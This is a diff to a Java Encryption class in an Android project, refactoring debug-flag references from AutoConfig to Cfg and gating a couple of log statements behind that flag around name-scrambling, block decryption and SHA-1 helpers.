@@ -17,9 +17,7 @@ import javax.crypto.NoSuchPaddingException;
 
 import android.util.Log;
 
-import com.android.service.Debug;
-import com.android.service.auto.AutoConfig;
-import com.android.service.conf.Configuration;
+import com.android.service.auto.Cfg;
 import com.android.service.util.Check;
 import com.android.service.util.Utils;
 
@@ -64,7 +62,7 @@ public class Encryption {
 	 * @return the string
 	 */
 	public static String encryptName(final String Name, final int seed) {
-		// Log.d("QZ", TAG + " seed : " + seed);
+		// if(AutoConfig.DEBUG) Log.d("QZ", TAG + " seed : " + seed);
 		return scramble(Name, seed, true);
 	}
 
@@ -166,10 +164,10 @@ public class Encryption {
 			crypto = new Crypto(key);
 		} catch (final NoSuchAlgorithmException e) {
 	
-			if(AutoConfig.DEBUG) { e.printStackTrace(); }
+			if(Cfg.DEBUG) { e.printStackTrace(); }
 		} catch (final NoSuchPaddingException e) {
 			
-			if(AutoConfig.DEBUG) { e.printStackTrace(); }
+			if(Cfg.DEBUG) { e.printStackTrace(); }
 		}
 	}
 
@@ -236,7 +234,7 @@ public class Encryption {
 
 			if ((i + 1 >= numblock) && (lastBlockLen != 0)) { // last turn
 				// and remaind
-				Log.d("QZ", TAG + " lastBlockLen: " + lastBlockLen);
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " lastBlockLen: " + lastBlockLen);
 				System.arraycopy(pt, 0, plain, i * 16, lastBlockLen);
 			} else {
 				System.arraycopy(pt, 0, plain, i * 16, 16);
@@ -295,7 +293,7 @@ public class Encryption {
 				iv = Utils.copy(ct);
 			} catch (final Exception e) {
 				// TODO Auto-generated catch block
-				if(AutoConfig.DEBUG) { e.printStackTrace(); }
+				if(Cfg.DEBUG) { e.printStackTrace(); }
 			}
 
 		}
@@ -325,7 +323,7 @@ public class Encryption {
 			return sha1;
 		} catch (final NoSuchAlgorithmException e) {
 			// TODO Auto-generated catch block
-			if(AutoConfig.DEBUG) { e.printStackTrace(); }
+			if(Cfg.DEBUG) { e.printStackTrace(); }
 		}
 		return null;
 	}
